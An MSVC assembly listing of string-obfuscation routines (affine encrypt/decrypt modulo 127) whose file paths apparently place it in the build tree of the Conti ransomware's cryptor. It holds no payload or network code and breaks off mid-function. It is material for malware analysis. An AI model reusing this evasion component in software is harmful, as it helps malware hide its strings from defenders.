;	COMDAT ?encrypt@?$MetaBuffer@$0DF@$0EM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0DF@$0EM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<53,76,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 35	 imul	 r8d, eax, 53		; 00000035H
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 4c	 add	 r8d, 76			; 0000004cH
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0DF@$0EM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<53,76,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0DF@$0EM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0DF@$0EM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ PROC ; MetaBuffer<53,76,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0DF@$0EM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ ENDP ; MetaBuffer<53,76,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0DL@$0CH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0DL@$0CH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<59,39,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	83 e8 27	 sub	 eax, 39			; 00000027H
  00006	44 6b c0 1c	 imul	 r8d, eax, 28

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0000f	41 f7 e8	 imul	 r8d
  00012	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00017	41 03 d0	 add	 edx, r8d
  0001a	c1 fa 06	 sar	 edx, 6
  0001d	8b ca		 mov	 ecx, edx
  0001f	c1 e9 1f	 shr	 ecx, 31
  00022	03 d1		 add	 edx, ecx
  00024	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00027	44 2b c1	 sub	 r8d, ecx
  0002a	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  0002e	41 f7 e8	 imul	 r8d
  00031	41 03 d0	 add	 edx, r8d
  00034	c1 fa 06	 sar	 edx, 6
  00037	8b ca		 mov	 ecx, edx
  00039	c1 e9 1f	 shr	 ecx, 31
  0003c	03 d1		 add	 edx, ecx
  0003e	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00041	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00044	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  00048	c3		 ret	 0
?decrypt@?$MetaBuffer@$0DL@$0CH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<59,39,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0DL@$0CH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0DL@$0CH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<59,39,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 3b	 imul	 r8d, eax, 59		; 0000003bH
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 27	 add	 r8d, 39			; 00000027H
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0DL@$0CH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<59,39,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0DL@$0CH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0DL@$0CH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ PROC ; MetaBuffer<59,39,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0DL@$0CH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ ENDP ; MetaBuffer<59,39,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0BN@$0BO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0BN@$0BO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<29,30,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	b9 1e 00 00 00	 mov	 ecx, 30
  00008	2b c8		 sub	 ecx, eax

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0000f	44 6b c1 23	 imul	 r8d, ecx, 35		; 00000023H

; 40   :     return (a % n + n) % n;

  00013	41 f7 e8	 imul	 r8d
  00016	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0001b	41 03 d0	 add	 edx, r8d
  0001e	c1 fa 06	 sar	 edx, 6
  00021	8b ca		 mov	 ecx, edx
  00023	c1 e9 1f	 shr	 ecx, 31
  00026	03 d1		 add	 edx, ecx
  00028	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  0002b	44 2b c1	 sub	 r8d, ecx
  0002e	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00032	41 f7 e8	 imul	 r8d
  00035	41 03 d0	 add	 edx, r8d
  00038	c1 fa 06	 sar	 edx, 6
  0003b	8b ca		 mov	 ecx, edx
  0003d	c1 e9 1f	 shr	 ecx, 31
  00040	03 d1		 add	 edx, ecx
  00042	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00045	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00048	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  0004c	c3		 ret	 0
?decrypt@?$MetaBuffer@$0BN@$0BO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<29,30,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0BN@$0BO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0BN@$0BO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<29,30,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 1d	 imul	 r8d, eax, 29
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 1e	 add	 r8d, 30
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0BN@$0BO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<29,30,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0BN@$0BO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0BN@$0BO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ PROC ; MetaBuffer<29,30,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0BN@$0BO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ ENDP ; MetaBuffer<29,30,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$01$06U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$01$06U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<2,7,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	b9 07 00 00 00	 mov	 ecx, 7
  00008	2b c8		 sub	 ecx, eax

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0000f	44 6b c1 3f	 imul	 r8d, ecx, 63		; 0000003fH

; 40   :     return (a % n + n) % n;

  00013	41 f7 e8	 imul	 r8d
  00016	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0001b	41 03 d0	 add	 edx, r8d
  0001e	c1 fa 06	 sar	 edx, 6
  00021	8b ca		 mov	 ecx, edx
  00023	c1 e9 1f	 shr	 ecx, 31
  00026	03 d1		 add	 edx, ecx
  00028	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  0002b	44 2b c1	 sub	 r8d, ecx
  0002e	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00032	41 f7 e8	 imul	 r8d
  00035	41 03 d0	 add	 edx, r8d
  00038	c1 fa 06	 sar	 edx, 6
  0003b	8b ca		 mov	 ecx, edx
  0003d	c1 e9 1f	 shr	 ecx, 31
  00040	03 d1		 add	 edx, ecx
  00042	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00045	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00048	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  0004c	c3		 ret	 0
?decrypt@?$MetaBuffer@$01$06U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<2,7,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$01$06U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$01$06U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<2,7,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 8d 04 45 07
	00 00 00	 lea	 r8d, DWORD PTR [rax*2+7]
  0000b	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$01$06U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<2,7,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$01$06U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$01$06U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ PROC ; MetaBuffer<2,7,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$01$06U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ ENDP ; MetaBuffer<2,7,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0CL@$0DG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0CL@$0DG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<43,54,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	b9 36 00 00 00	 mov	 ecx, 54			; 00000036H
  00008	2b c8		 sub	 ecx, eax

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0000f	44 6b c1 3e	 imul	 r8d, ecx, 62		; 0000003eH

; 40   :     return (a % n + n) % n;

  00013	41 f7 e8	 imul	 r8d
  00016	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0001b	41 03 d0	 add	 edx, r8d
  0001e	c1 fa 06	 sar	 edx, 6
  00021	8b ca		 mov	 ecx, edx
  00023	c1 e9 1f	 shr	 ecx, 31
  00026	03 d1		 add	 edx, ecx
  00028	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  0002b	44 2b c1	 sub	 r8d, ecx
  0002e	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00032	41 f7 e8	 imul	 r8d
  00035	41 03 d0	 add	 edx, r8d
  00038	c1 fa 06	 sar	 edx, 6
  0003b	8b ca		 mov	 ecx, edx
  0003d	c1 e9 1f	 shr	 ecx, 31
  00040	03 d1		 add	 edx, ecx
  00042	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00045	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00048	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  0004c	c3		 ret	 0
?decrypt@?$MetaBuffer@$0CL@$0DG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<43,54,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0CL@$0DG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0CL@$0DG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<43,54,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 2b	 imul	 r8d, eax, 43		; 0000002bH
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 36	 add	 r8d, 54			; 00000036H
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0CL@$0DG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<43,54,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0CL@$0DG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0CL@$0DG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ PROC ; MetaBuffer<43,54,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0CL@$0DG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ ENDP ; MetaBuffer<43,54,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0GB@$02U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0GB@$02U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<97,3,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	83 e8 03	 sub	 eax, 3
  00006	44 6b c0 37	 imul	 r8d, eax, 55		; 00000037H

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0000f	41 f7 e8	 imul	 r8d
  00012	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00017	41 03 d0	 add	 edx, r8d
  0001a	c1 fa 06	 sar	 edx, 6
  0001d	8b ca		 mov	 ecx, edx
  0001f	c1 e9 1f	 shr	 ecx, 31
  00022	03 d1		 add	 edx, ecx
  00024	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00027	44 2b c1	 sub	 r8d, ecx
  0002a	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  0002e	41 f7 e8	 imul	 r8d
  00031	41 03 d0	 add	 edx, r8d
  00034	c1 fa 06	 sar	 edx, 6
  00037	8b ca		 mov	 ecx, edx
  00039	c1 e9 1f	 shr	 ecx, 31
  0003c	03 d1		 add	 edx, ecx
  0003e	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00041	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00044	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  00048	c3		 ret	 0
?decrypt@?$MetaBuffer@$0GB@$02U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<97,3,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0GB@$02U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0GB@$02U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<97,3,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 61	 imul	 r8d, eax, 97		; 00000061H
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 03	 add	 r8d, 3
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0GB@$02U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<97,3,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0GB@$02U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0GB@$02U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ PROC ; MetaBuffer<97,3,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0GB@$02U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ ENDP ; MetaBuffer<97,3,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0GL@$0EA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0GL@$0EA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<107,64,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	83 e8 40	 sub	 eax, 64			; 00000040H
  00006	44 6b c0 13	 imul	 r8d, eax, 19

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0000f	41 f7 e8	 imul	 r8d
  00012	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
